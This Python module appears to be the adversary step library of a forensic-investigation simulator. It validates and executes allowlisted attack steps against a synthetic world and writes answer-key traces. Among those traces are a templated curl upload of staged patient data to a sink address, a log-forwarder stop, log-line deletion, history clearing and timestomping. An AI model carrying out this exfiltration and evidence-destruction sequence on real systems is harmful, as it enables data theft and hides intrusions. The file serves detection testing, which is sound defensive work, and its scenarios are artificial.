"""The adversary step library: the ONLY things the adversary can do (PLAN 8.3).

Every step is a fixed, deterministic mutation of the synthetic world with
allowlisted parameters. There is no shell, no code generation, no free-form
command, no regex, no URL and no host path supplied by a model. A plan is data:
a list of {step, params, delay_s}. Trusted orchestrator code validates it and
executes it; the answer key records what actually happened, not what was intended.

Phase two adds steps for the records-server and cold-chain case families and four
bounded anti-forensic/movement steps. They are the same kind of thing: a state change
in a simulated world. Nothing here runs a command or touches a network.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Any

from alibi.sim.world import APP_LOG, AUTH_LOG, IPS, SYSLOG, TraceRef, World

MAX_PLAN_STEPS = 8
MIN_DELAY_S = 20
MAX_DELAY_S = 600

# Synthetic objects that may be staged. Sizes are set per scenario.
DATASETS = ("patients_full", "immunization_registry")
STAGING_DIRS = ("/var/tmp/.pkg-cache", "/var/tmp/xfer", "/tmp/.font-unix", "/home/{account}/Downloads")
STAGING_NAME_RE = re.compile(r"^[a-z0-9][a-z0-9._-]{2,23}$")
DELETE_SELECTIONS = ("own_session_open", "own_session_all")
DELETE_HOSTS = ("workstation", "collector")
DELETE_FILES = (AUTH_LOG,)

# --- phase two allowlists
REMOTE_HOSTS = ("records",)  # hosts a simulated remote session may be opened on
REMOTE_VIA = ("vpn-gw",)  # where a first remote session may come from
DUMP_DIRS = ("/srv/records/tmp", "/var/tmp/.cache")  # staging directories on the records host
RECORDS_DELETE_HOSTS = ("records", "collector")
RECORDS_DELETE_FILES = (AUTH_LOG, APP_LOG)
APP_DELETE_SELECTIONS = ("own_exports",)  # the bulk-export records made by this session's account in this session
HISTORY_SCOPES = ("own_session", "all")
TIMESTOMP_MODES = ("backdate_30d",)
FORWARDER_HOSTS = ("workstation", "records")
FORWARDER_MIN_S, FORWARDER_MAX_S = 60, 900
SENSORS = ("fridge-01",)
FALSIFY_MODES = ("flatten",)

LEVEL_STEPS: dict[str, tuple[str, ...]] = {
    "L1": ("login_as", "stage_copy", "exfil_http"),
    "L2": ("login_as", "stage_copy", "exfil_http", "delete_log_lines"),
    # phase two
    "L3": ("login_as", "stage_copy", "exfil_http", "delete_log_lines", "clear_history", "timestomp",
           "stop_forwarder", "second_host_session"),
    "H1": ("login_remote", "export_dump", "exfil_http"),
    "H2": ("login_remote", "export_dump", "exfil_http", "delete_log_lines", "clear_history", "timestomp",
           "stop_forwarder"),
    "C1": ("falsify_readings",),
}
FIRST_STEPS: dict[str, tuple[str, ...]] = {
    "L1": ("login_as",), "L2": ("login_as",), "L3": ("login_as",),
    "H1": ("login_remote",), "H2": ("login_remote",), "C1": ("falsify_readings",),
}

# ATT&CK labels are explanatory metadata only; the scorer matches internal effect types.
ATTACK_META: dict[str, dict[str, str | None]] = {
    "login_as": {"attack_id": "T1078", "label": "Valid Accounts"},
    "stage_copy": {"attack_id": "T1074.001", "label": "Data Staged: Local Data Staging"},
    "exfil_http": {
        "attack_id": None,
        "label": "Transfer to a non-approved destination over HTTP (exfiltration mapping is context-dependent)",
    },
    # Verified 2026-11-14 against attack.mitre.org: the former T1070.002 now redirects to T1685.006.
    # Closest entry only: the simulated step removes selected lines, it does not clear a whole log.
    "delete_log_lines": {"attack_id": "T1685.006", "label": "Disable or Modify Tools: Clear Linux or Mac System Logs"},
    # Phase-two steps carry a plain description and NO technique id: the ids for these were not
    # checked against the current ATT&CK release, and an unverified id would be a false citation.
    "login_remote": {"attack_id": "T1078", "label": "Valid Accounts (remote session)"},
    "export_dump": {"attack_id": "T1074.001", "label": "Data Staged: Local Data Staging (export on the records host)"},
    "clear_history": {"attack_id": None, "label": "Shell history cleared (technique id not verified)"},
    "timestomp": {"attack_id": None, "label": "File modification time changed (technique id not verified)"},
    "stop_forwarder": {"attack_id": None, "label": "Log forwarding stopped (technique id not verified)"},
    "second_host_session": {"attack_id": None, "label": "Session opened on a second host (technique id not verified)"},
    "falsify_readings": {"attack_id": None, "label": "Stored sensor readings altered (technique id not verified)"},
}


class PlanError(ValueError):
    """A plan failed validation. The message is safe to show to a planning model."""


@dataclass
class PlanContext:
    """What a plan may refer to in this scenario (all synthetic, all allowlisted)."""

    level: str
    accounts: tuple[str, ...]  # accounts whose credentials are on the planted note
    sink_ips: tuple[str, ...]  # internal dummy destinations only
    dataset_sizes: dict[str, int]
    max_total_delay_s: int | None = None  # when set, the sum of all delays must stay within it
    admin_accounts: tuple[str, ...] = ()  # accounts that may open remote sessions and control services
    sensors: tuple[str, ...] = ()  # sensors whose stored readings exist in this scenario


def _require(cond: bool, msg: str) -> None:
    if not cond:
        raise PlanError(msg)


def validate_plan(plan: list[dict[str, Any]], ctx: PlanContext) -> list[dict[str, Any]]:
    """Validate structure, allowlists and precondition order. Returns a normalized copy."""
    _require(isinstance(plan, list) and plan, "plan must be a non-empty list of steps")
    _require(len(plan) <= MAX_PLAN_STEPS, f"plan has {len(plan)} steps; the maximum is {MAX_PLAN_STEPS}")
    allowed = LEVEL_STEPS.get(ctx.level)
    _require(allowed is not None, f"unknown difficulty level {ctx.level!r}")
    records_family = ctx.level.startswith("H")
    out: list[dict[str, Any]] = []
    logged_in_as: str | None = None
    session_hosts: dict[str, str] = {}  # host -> account of the session a plan has opened there
    staged: set[str] = set()
    for i, raw in enumerate(plan):
        where = f"step {i + 1}"
        _require(isinstance(raw, dict), f"{where}: must be an object")
        _require(set(raw) <= {"step", "params", "delay_s"}, f"{where}: unknown keys {sorted(set(raw) - {'step', 'params', 'delay_s'})}")
        name = raw.get("step")
        _require(name in allowed, f"{where}: step {name!r} is not allowed at {ctx.level}; allowed: {list(allowed)}")
        params = raw.get("params") or {}
        _require(isinstance(params, dict), f"{where}: params must be an object")
        delay = raw.get("delay_s", 60)
        _require(isinstance(delay, (int, float)) and not isinstance(delay, bool), f"{where}: delay_s must be a number")
        delay = int(delay)
        _require(MIN_DELAY_S <= delay <= MAX_DELAY_S, f"{where}: delay_s must be between {MIN_DELAY_S} and {MAX_DELAY_S}")

        if name == "login_as":
            _require(set(params) <= {"account"}, f"{where}: login_as takes only 'account'")
            _require(params.get("account") in ctx.accounts, f"{where}: account must be one of {list(ctx.accounts)}")
            _require(logged_in_as is None, f"{where}: already logged in")
            logged_in_as = params["account"]
            session_hosts["workstation"] = logged_in_as
        elif name == "stage_copy":
            _require(set(params) <= {"src", "dst_dir", "dst_name"}, f"{where}: stage_copy takes src, dst_dir, dst_name")
            _require(logged_in_as is not None, f"{where}: stage_copy requires a prior login_as")
            _require(params.get("src") in DATASETS and params.get("src") in ctx.dataset_sizes,
                     f"{where}: src must be one of {list(DATASETS)}")
            _require(params.get("dst_dir") in STAGING_DIRS, f"{where}: dst_dir must be one of {list(STAGING_DIRS)}")
            name_ok = isinstance(params.get("dst_name"), str) and STAGING_NAME_RE.match(params["dst_name"])
            _require(bool(name_ok), f"{where}: dst_name must match {STAGING_NAME_RE.pattern}")
            staged.add(staging_path(params["dst_dir"], params["dst_name"], logged_in_as))
        elif name == "exfil_http":
            _require(set(params) <= {"path", "dst"}, f"{where}: exfil_http takes path, dst")
            _require(logged_in_as is not None, f"{where}: exfil_http requires a prior login_as")
            _require(params.get("path") in staged, f"{where}: path must be a file staged earlier in this plan: {sorted(staged)}")
            _require(params.get("dst") in ctx.sink_ips, f"{where}: dst must be one of the internal sink addresses {list(ctx.sink_ips)}")
        elif name == "delete_log_lines":
            hosts = RECORDS_DELETE_HOSTS if records_family else DELETE_HOSTS
            files = RECORDS_DELETE_FILES if records_family else DELETE_FILES
            selections = DELETE_SELECTIONS + (APP_DELETE_SELECTIONS if records_family else ())
            _require(set(params) <= {"host", "file", "event_selection"}, f"{where}: delete_log_lines takes host, file, event_selection")
            _require(logged_in_as is not None, f"{where}: delete_log_lines requires a prior login_as")
            _require(params.get("host") in hosts, f"{where}: host must be one of {list(hosts)}")
            _require(params.get("file") in files, f"{where}: file must be one of {list(files)}")
            _require(params.get("event_selection") in selections,
                     f"{where}: event_selection must be one of {list(selections)}")
        elif name == "login_remote":
            _require(set(params) <= {"host", "account", "via"}, f"{where}: login_remote takes host, account, via")
            _require(params.get("host") in REMOTE_HOSTS, f"{where}: host must be one of {list(REMOTE_HOSTS)}")
            _require(params.get("account") in ctx.admin_accounts,
                     f"{where}: account must be one of {list(ctx.admin_accounts)}")
            _require(params.get("via") in REMOTE_VIA, f"{where}: via must be one of {list(REMOTE_VIA)}")
            _require(logged_in_as is None, f"{where}: already logged in")
            logged_in_as = params["account"]
            session_hosts[params["host"]] = logged_in_as
        elif name == "export_dump":
            _require(set(params) <= {"dataset", "dst_dir", "dst_name"}, f"{where}: export_dump takes dataset, dst_dir, dst_name")
            _require("records" in session_hosts, f"{where}: export_dump requires a prior session on the records host")
            _require(params.get("dataset") in DATASETS and params.get("dataset") in ctx.dataset_sizes,
                     f"{where}: dataset must be one of {list(DATASETS)}")
            _require(params.get("dst_dir") in DUMP_DIRS, f"{where}: dst_dir must be one of {list(DUMP_DIRS)}")
            name_ok = isinstance(params.get("dst_name"), str) and STAGING_NAME_RE.match(params["dst_name"])
            _require(bool(name_ok), f"{where}: dst_name must match {STAGING_NAME_RE.pattern}")
            staged.add(f"{params['dst_dir']}/{params['dst_name']}")
        elif name == "second_host_session":
            _require(set(params) <= {"host", "account"}, f"{where}: second_host_session takes host, account")
            _require(logged_in_as is not None, f"{where}: second_host_session requires a prior login_as")
            _require(params.get("host") in REMOTE_HOSTS, f"{where}: host must be one of {list(REMOTE_HOSTS)}")
            _require(params.get("host") not in session_hosts, f"{where}: a session on {params.get('host')} is already open")
            _require(params.get("account") in ctx.admin_accounts,
                     f"{where}: account must be one of {list(ctx.admin_accounts)}")
            session_hosts[params["host"]] = params["account"]
        elif name == "stop_forwarder":
            _require(set(params) <= {"host", "duration_s"}, f"{where}: stop_forwarder takes host, duration_s")
            _require(logged_in_as is not None, f"{where}: stop_forwarder requires a prior login")
            _require(params.get("host") in FORWARDER_HOSTS, f"{where}: host must be one of {list(FORWARDER_HOSTS)}")
            dur = params.get("duration_s")
            _require(isinstance(dur, int) and not isinstance(dur, bool) and FORWARDER_MIN_S <= dur <= FORWARDER_MAX_S,
                     f"{where}: duration_s must be a whole number between {FORWARDER_MIN_S} and {FORWARDER_MAX_S}")
        elif name == "clear_history":
            _require(set(params) <= {"scope"}, f"{where}: clear_history takes only 'scope'")
            _require(logged_in_as is not None, f"{where}: clear_history requires a prior login")
            _require(params.get("scope") in HISTORY_SCOPES, f"{where}: scope must be one of {list(HISTORY_SCOPES)}")
        elif name == "timestomp":
            _require(set(params) <= {"path", "mode"}, f"{where}: timestomp takes path, mode")
            _require(logged_in_as is not None, f"{where}: timestomp requires a prior login")
            _require(params.get("path") in staged, f"{where}: path must be a file staged earlier in this plan: {sorted(staged)}")
            _require(params.get("mode") in TIMESTOMP_MODES, f"{where}: mode must be one of {list(TIMESTOMP_MODES)}")
        elif name == "falsify_readings":
            _require(set(params) <= {"sensor", "mode"}, f"{where}: falsify_readings takes sensor, mode")
            _require(params.get("sensor") in SENSORS and params.get("sensor") in ctx.sensors,
                     f"{where}: sensor must be one of {list(ctx.sensors)}")
            _require(params.get("mode") in FALSIFY_MODES, f"{where}: mode must be one of {list(FALSIFY_MODES)}")
        out.append({"step": name, "params": dict(params), "delay_s": delay})
    first = FIRST_STEPS[ctx.level]
    _require(out[0]["step"] in first,
             "the first step must be login_as" if first == ("login_as",) else f"the first step must be one of {list(first)}")
    if ctx.max_total_delay_s is not None:
        total = sum(step["delay_s"] for step in out)
        _require(total <= ctx.max_total_delay_s,
                 f"the delays add up to {total} s; the whole plan must fit in {ctx.max_total_delay_s} s")
    return out


def staging_path(dst_dir: str, dst_name: str, account: str) -> str:
    return f"{dst_dir.replace('{account}', account)}/{dst_name}"


@dataclass
class StepResult:
    step: str
    params: dict[str, Any]
    t_start: datetime
    t_end: datetime
    status: str  # succeeded | failed | partial
    outcome: str
    host: str
    account_used: str | None = None
    affected_object: str | None = None
    affected_session: str | None = None
    artifacts_touched: list[str] = field(default_factory=list)
    effect_type: str | None = None
    effect_window: tuple[datetime, datetime] | None = None
    traces: list[TraceRef] = field(default_factory=list)
    # An effect that happened in the world but that no captured source can show is recorded,
    # reported as unobservable, and never scored.
    observable: bool = True
    unobservable_reason: str | None = None


class StepExecutor:
    """Executes validated steps against the SimBackend world and reports real outcomes."""

    def __init__(self, world: World, ctx: PlanContext):
        self.world = world
        self.ctx = ctx
        self.session = None  # the session the plan's login step opened
        self.account: str | None = None
        self.host = "workstation"  # the host of that session
        self.extra_sessions: dict[str, Any] = {}  # host -> a second-host session opened from the first
        self.staged: dict[str, int] = {}
        self.staged_witness: dict[str, list[TraceRef]] = {}  # path -> independent records of its arrival
        self.results: list[StepResult] = []

    def execute(self, step: dict[str, Any], t: datetime) -> StepResult:
        fn = getattr(self, f"_do_{step['step']}")
        res: StepResult = fn(t, **step["params"])
        self.results.append(res)
        return res

    def _active(self) -> bool:
        return self.session is not None and self.session.closed is None

    def _session_on(self, host: str) -> Any:
        if self._active() and self.host == host:
            return self.session
        extra = self.extra_sessions.get(host)
        return extra if extra is not None and extra.closed is None else None

    def _with_copy(self, host: str, file: str, ref: TraceRef) -> list[TraceRef]:
        copy = self.world.collector_copy_of(host, file, ref.raw)
        return [ref] + ([copy] if copy is not None else [])

    # -- login_as -------------------------------------------------------------
    def _do_login_as(self, t: datetime, account: str) -> StepResult:
        w = self.world
        if w.console_busy_until is not None and t < w.console_busy_until:
            return StepResult("login_as", {"account": account}, t, t, "failed",
                              "console in use by another session", "workstation", account_used=account)
        sess, ref = w.open_session("workstation", account, t, origin="console", tty="tty1")
        self.session, self.account = sess, account
        return StepResult("login_as", {"account": account}, t, t + timedelta(seconds=2), "succeeded",
                          f"console session {sess.number} opened as {account}", "workstation",
                          account_used=account, affected_object="tty1", affected_session=sess.session_id,
                          artifacts_touched=[f"workstation:{AUTH_LOG}"], traces=[ref])

    # -- stage_copy -----------------------------------------------------------
    def _do_stage_copy(self, t: datetime, src: str, dst_dir: str, dst_name: str) -> StepResult:
        w = self.world
        params = {"src": src, "dst_dir": dst_dir, "dst_name": dst_name}
        if self.session is None or self.session.closed is not None:
            return StepResult("stage_copy", params, t, t, "failed", "no active session", "workstation")
        path = staging_path(dst_dir, dst_name, self.account or "")
        size = self.ctx.dataset_sizes[src]
        dur = max(3, int(size / 4_000_000))
        t_end = t + timedelta(seconds=dur)
        traces = [
            w.history("workstation", self.account, t, f"clinic-export --dataset {src} --out {path}"),
            w.log("records", "/var/log/records-app/access.log", t + timedelta(seconds=1), "records-app[880]",
                  f"user={self.account} client={IPS['workstation']} action=export_bulk dataset={src} bytes={size} status=200"),
            w.flow(t + timedelta(seconds=1), IPS["workstation"], IPS["records"], 443, 1400 + w.rng.randrange(0, 600), size + 2200, duration_s=dur),
            w.write_file("workstation", path, size, self.account, t_end),
        ]
        self.staged[path] = size
        copy = w.collector_copy_of("records", APP_LOG, traces[1].raw)
        self.staged_witness[path] = [traces[2]] + ([copy] if copy is not None else [])
        return StepResult("stage_copy", params, t, t_end, "succeeded",
                          f"{src} ({size} bytes) written to {path}", "workstation", account_used=self.account,
                          affected_object=path, affected_session=self.session.session_id,
                          artifacts_touched=["workstation:fs_stat", "workstation:history", "records:/var/log/records-app/access.log", "tap:flows"],
                          effect_type="data_staging", effect_window=(t, t_end), traces=traces)

    # -- exfil_http -----------------------------------------------------------
    def _do_exfil_http(self, t: datetime, path: str, dst: str) -> StepResult:
        w = self.world
        host = self.host
        params = {"path": path, "dst": dst}
        if self.session is None or self.session.closed is not None:
            return StepResult("exfil_http", params, t, t, "failed", "no active session", host)
        if path not in self.staged:
            return StepResult("exfil_http", params, t, t, "failed", "source file does not exist", host,
                              account_used=self.account, affected_session=self.session.session_id)
        size = self.staged[path]
        dur = max(4, int(size / 1_500_000))
        t_end = t + timedelta(seconds=dur)
        name = path.rsplit("/", 1)[-1]
        traces = [
            w.history(host, self.account, t, f"curl -s -T {path} http://{dst}:8080/u/{name}"),
            w.flow(t, IPS[host], dst, 8080, size + 3100 + w.rng.randrange(0, 900), 380 + w.rng.randrange(0, 120), duration_s=dur),
        ]
        return StepResult("exfil_http", params, t, t_end, "succeeded",
                          f"{size} bytes sent from {path} to {dst}:8080", host, account_used=self.account,
                          affected_object=f"{dst}:8080", affected_session=self.session.session_id,
                          artifacts_touched=[f"{host}:history", "tap:flows"],
                          effect_type="policy_violating_transfer", effect_window=(t, t_end), traces=traces)

    # -- delete_log_lines -----------------------------------------------------
    def _do_delete_log_lines(self, t: datetime, host: str, file: str, event_selection: str) -> StepResult:
        w = self.world
        params = {"host": host, "file": file, "event_selection": event_selection}
        sid = self.session.session_id if self.session else None
        if self.session is None or self.session.closed is not None:
            return StepResult("delete_log_lines", params, t, t, "failed", "no active session", host)
        if host != self.host:
            # The collector is an independent witness: not writable from a monitored host's session.
            return StepResult("delete_log_lines", params, t, t + timedelta(seconds=1), "failed",
                              f"permission denied: {host} is not writable from this session", host,
                              account_used=self.account, affected_object=file, affected_session=sid)
        lf = w.logs[(host, file)]
        if event_selection in APP_DELETE_SELECTIONS:
            # the bulk-export records this session's account produced since the session opened
            victims = [ln for ln in lf.current if f"user={self.account} " in ln.text and "action=export_bulk" in ln.text
                       and ln.ts >= self.session.opened]
        else:
            marker = f"(session {self.session.number})"
            victims = [ln for ln in lf.current if marker in ln.text]
            if event_selection == "own_session_open":
                victims = [ln for ln in victims if "session opened" in ln.text]
        if not victims:
            return StepResult("delete_log_lines", params, t, t + timedelta(seconds=1), "failed",
                              "no matching lines present in the current local file", host,
                              account_used=self.account, affected_object=file, affected_session=sid)
        gone = {ln.uid for ln in victims}
        lf.current = [ln for ln in lf.current if ln.uid not in gone]
        traces: list[TraceRef] = []
        for ln in victims:
            traces.append(TraceRef(artifact_logical=f"{host}:{file}", raw=ln.text, ts=ln.ts, role="removed_local"))
            copy = w.collector_copy_of(host, file, ln.text)
            if copy is not None:
                traces.append(copy)
        window = (min(ln.ts for ln in victims), max(ln.ts for ln in victims))
        return StepResult("delete_log_lines", params, t, t + timedelta(seconds=2), "succeeded",
                          f"{len(victims)} line(s) removed from local {file}; collector copies untouched", host,
                          account_used=self.account, affected_object=file, affected_session=sid,
                          artifacts_touched=[f"{host}:{file}"], effect_type="local_log_removal",
                          effect_window=window, traces=traces)

    # ======================================================================= phase two
    # -- login_remote ---------------------------------------------------------
    def _do_login_remote(self, t: datetime, host: str, account: str, via: str) -> StepResult:
        """Open a remote session on a server with an administrative credential. No effect is scored:
        using a valid account is not by itself an incident."""
        w = self.world
        params = {"host": host, "account": account, "via": via}
        if self.session is not None:
            return StepResult("login_remote", params, t, t, "failed", "a session is already open", host, account_used=account)
        sess, ref = w.open_session(host, account, t, origin="remote", src_ip=IPS[via])
        self.session, self.account, self.host = sess, account, host
        return StepResult("login_remote", params, t, t + timedelta(seconds=2), "succeeded",
                          f"remote session {sess.number} opened on {host} as {account} from {IPS[via]}", host,
                          account_used=account, affected_object=f"ssh:{IPS[via]}", affected_session=sess.session_id,
                          artifacts_touched=[f"{host}:{AUTH_LOG}", "tap:flows"], traces=[ref, w.last_flow_ref()])

    # -- export_dump ----------------------------------------------------------
    def _do_export_dump(self, t: datetime, dataset: str, dst_dir: str, dst_name: str) -> StepResult:
        """A local bulk export on the records host, written to a file there. The records application
        logs it like any other export; no network transfer is involved in this step."""
        w = self.world
        params = {"dataset": dataset, "dst_dir": dst_dir, "dst_name": dst_name}
        if not self._active() or self.host != "records":
            return StepResult("export_dump", params, t, t, "failed", "no active session on the records host", "records")
        path = f"{dst_dir}/{dst_name}"
        size = self.ctx.dataset_sizes[dataset]
        dur = max(3, int(size / 6_000_000))
        t_end = t + timedelta(seconds=dur)
        app = w.log("records", APP_LOG, t + timedelta(seconds=1), "records-app[880]",
                    f"user={self.account} client=127.0.0.1 action=export_bulk dataset={dataset} bytes={size} status=200")
        traces = [w.history("records", self.account, t, f"records-dump --dataset {dataset} --out {path}"),
                  *self._with_copy("records", APP_LOG, app),
                  w.write_file("records", path, size, self.account, t_end)]
        self.staged[path] = size
        self.staged_witness[path] = [x for x in traces if x.role == "collector_copy"]
        return StepResult("export_dump", params, t, t_end, "succeeded",
                          f"{dataset} ({size} bytes) written to {path} on the records host", "records",
                          account_used=self.account, affected_object=path, affected_session=self.session.session_id,
                          artifacts_touched=["records:fs_stat", "records:history", f"records:{APP_LOG}"],
                          effect_type="data_staging", effect_window=(t, t_end), traces=traces)

    # -- second_host_session ---------------------------------------------------
    def _do_second_host_session(self, t: datetime, host: str, account: str) -> StepResult:
        """Open a session on a second host from the first one. Simulated: an auth record on the
        target and a flow record at the tap. No real connection is made."""
        w = self.world
        params = {"host": host, "account": account}
        if not self._active():
            return StepResult("second_host_session", params, t, t, "failed", "no active first session", host,
                              account_used=account)
        if host == self.host or host in self.extra_sessions:
            return StepResult("second_host_session", params, t, t, "failed", f"a session on {host} is already open",
                              host, account_used=account, affected_session=self.session.session_id)
        sess, ref = w.open_session(host, account, t, origin="remote", src_ip=IPS[self.host])
        self.extra_sessions[host] = sess
        traces = [*self._with_copy(host, AUTH_LOG, ref), w.last_flow_ref()]
        return StepResult("second_host_session", params, t, t + timedelta(seconds=2), "succeeded",
                          f"session {sess.number} opened on {host} as {account} from {self.host} ({IPS[self.host]})", host,
                          account_used=account, affected_object=f"ssh:{IPS[self.host]}", affected_session=sess.session_id,
                          artifacts_touched=[f"{host}:{AUTH_LOG}", "tap:flows"],
                          effect_type="second_host_session", effect_window=(t, t), traces=traces)

    # -- stop_forwarder -------------------------------------------------------
    def _do_stop_forwarder(self, t: datetime, host: str, duration_s: int) -> StepResult:
        """Stop log forwarding on a host for a bounded time. Needs a session on that host whose
        account may control services; anything else is a recorded failed attempt."""
        w = self.world
        params = {"host": host, "duration_s": duration_s}
        sess = self._session_on(host)
        if sess is None:
            return StepResult("stop_forwarder", params, t, t, "failed", f"no active session on {host}", host,
                              account_used=self.account)
        if sess.account not in self.ctx.admin_accounts:
            # the attempt itself is logged locally and shipped, like any denied privileged command
            ref = w.log(host, AUTH_LOG, t, f"sudo[{w.next_pid()}]",
                        f"{sess.account} : user NOT in sudoers ; TTY=tty1 ; COMMAND=/usr/bin/systemctl stop log-forwarder "
                        f"(session {sess.number})")
            return StepResult("stop_forwarder", params, t, t + timedelta(seconds=1), "failed",
                              f"permission denied: {sess.account} may not control services on {host}", host,
                              account_used=sess.account, affected_object="log-forwarder", affected_session=sess.session_id,
                              artifacts_touched=[f"{host}:{AUTH_LOG}"], traces=[ref])
        end = t + timedelta(seconds=1 + duration_s)
        hist = w.history(host, sess.account, t, "sudo systemctl stop log-forwarder")
        sudo = w.log(host, AUTH_LOG, t, f"sudo[{w.next_pid()}]",
                     f"{sess.account} : TTY=pts/0 ; COMMAND=/usr/bin/systemctl stop log-forwarder (session {sess.number})")
        stop = w.log(host, SYSLOG, t, "systemd[1]", "Stopping log-forwarder.service...")
        w.stop_forwarding(host, t + timedelta(seconds=1), end)
        w.schedule(end + timedelta(seconds=1),
                   lambda ts: w.log(host, SYSLOG, ts, "systemd[1]", "Started log-forwarder.service."))
        traces = [hist, *self._with_copy(host, AUTH_LOG, sudo), *self._with_copy(host, SYSLOG, stop)]
        return StepResult("stop_forwarder", params, t, end, "succeeded",
                          f"log forwarding from {host} stopped for {duration_s} s", host, account_used=sess.account,
                          affected_object="log-forwarder", affected_session=sess.session_id,
                          artifacts_touched=[f"{host}:{AUTH_LOG}", f"{host}:{SYSLOG}", f"{host}:history", "collector"],
                          effect_type="forwarding_stopped", effect_window=(t, end), traces=traces)

    # -- clear_history --------------------------------------------------------
    def _do_clear_history(self, t: datetime, scope: str) -> StepResult:
        """Remove the session account's shell-history entries. Shell history is host-local and is
        not forwarded, so the removal has no independent witness: it is recorded as unobservable."""
        w = self.world
        params = {"scope": scope}
        if not self._active():
            return StepResult("clear_history", params, t, t, "failed", "no active session", self.host)
        gone = w.clear_history(self.host, self.account or "", self.session.opened if scope == "own_session" else None)
        path = f"/home/{self.account}/.bash_history"
        if not gone:
            return StepResult("clear_history", params, t, t + timedelta(seconds=1), "failed",
                              "no shell-history entries to remove", self.host, account_used=self.account,
                              affected_object=path, affected_session=self.session.session_id)
        traces = [TraceRef(artifact_logical=f"{self.host}:history:{self.account}", raw=cmd, ts=ts, role="removed_local")
                  for ts, cmd in gone]
        return StepResult("clear_history", params, t, t + timedelta(seconds=1), "succeeded",
                          f"{len(gone)} shell-history entr{'y' if len(gone) == 1 else 'ies'} removed from {path}", self.host,
                          account_used=self.account, affected_object=path, affected_session=self.session.session_id,
                          artifacts_touched=[f"{self.host}:history"], effect_type="shell_history_removal",
                          effect_window=(min(g[0] for g in gone), max(g[0] for g in gone)), traces=traces,
                          observable=False,
                          unobservable_reason=("shell history is host-local and is not forwarded; no captured source "
                                               "holds an independent copy of the removed commands"))

    # -- timestomp ------------------------------------------------------------
    def _do_timestomp(self, t: datetime, path: str, mode: str) -> StepResult:
        """Back-date a staged file's modification time. The inode change time moves to now. The
        effect is observable only where an independent record shows when the content really arrived."""
        w = self.world
        params = {"path": path, "mode": mode}
        if not self._active():
            return StepResult("timestomp", params, t, t, "failed", "no active session", self.host)
        if path not in self.staged or path not in w.files.get(self.host, {}):
            return StepResult("timestomp", params, t, t, "failed", "the file does not exist on this host", self.host,
                              account_used=self.account, affected_session=self.session.session_id)
        old = w.files[self.host][path]["mtime"] - timedelta(days=30)
        row = w.set_file_times(self.host, path, old, t)
        witness = self.staged_witness.get(path, [])
        return StepResult("timestomp", params, t, t + timedelta(seconds=1), "succeeded",
                          f"modification time of {path} set back 30 days; change time is now {t.isoformat()}", self.host,
                          account_used=self.account, affected_object=path, affected_session=self.session.session_id,
                          artifacts_touched=[f"{self.host}:fs_stat"], effect_type="timestamp_alteration",
                          effect_window=(t, t), traces=[row, *witness], observable=bool(witness),
                          unobservable_reason=None if witness else
                          "no independent record shows when this file's content arrived on the host")

    # -- falsify_readings -----------------------------------------------------
    def _do_falsify_readings(self, t: datetime, sensor: str, mode: str) -> StepResult:
        """Overwrite out-of-range readings in the hub's own store with in-range values. The
        independent reference logger is a separate device and is not reachable from the hub."""
        w = self.world
        params = {"sensor": sensor, "mode": mode}
        rows = w.sensor_local.get(sensor, [])
        lo, hi = getattr(w, "sensor_range", (2.0, 8.0))
        # only readings the hub itself marked as an alarm; calibration readings are not refrigerator temperatures
        victims = [r for r in rows if datetime.fromisoformat(r["ts"]) <= t and r.get("state") == "alarm"]
        if not victims:
            return StepResult("falsify_readings", params, t, t, "failed",
                              "no out-of-range reading is stored for this sensor", "iot-hub", affected_object=sensor)
        for r in victims:
            r["temp_c"] = round(min(hi - 0.4, max(lo + 0.4, 4.4 + w.rng.randrange(0, 13) / 10)), 1)
            r["state"] = "ok"
        first, last = datetime.fromisoformat(victims[0]["ts"]), datetime.fromisoformat(victims[-1]["ts"])
        traces = [TraceRef(artifact_logical="iot-hub:sensor", raw=w.sensor_line(r), ts=datetime.fromisoformat(r["ts"]))
                  for r in victims]
        offset = timedelta(seconds=getattr(w, "reference_clock_offset_s", 0))
        tol = timedelta(seconds=150)
        witness = [TraceRef(artifact_logical="reference", raw=w.reference_line(r), ts=datetime.fromisoformat(r["ts"]))
                   for logger in sorted(w.sensor_ref) for r in w.sensor_ref[logger]
                   if r["monitors"] == sensor and not lo <= r["temp_c"] <= hi
                   and first - tol <= datetime.fromisoformat(r["ts"]) - offset <= last + tol]
        return StepResult("falsify_readings", params, t, t + timedelta(seconds=2), "succeeded",
                          f"{len(victims)} stored reading(s) of {sensor} overwritten with in-range values", "iot-hub",
                          affected_object=sensor, artifacts_touched=["iot-hub:sensor"],
                          effect_type="sensor_stream_discrepancy", effect_window=(first, last),
                          traces=traces + witness, observable=bool(witness),
                          unobservable_reason=None if witness else
                          "the independent reference logger recorded no out-of-range reading in the altered interval")
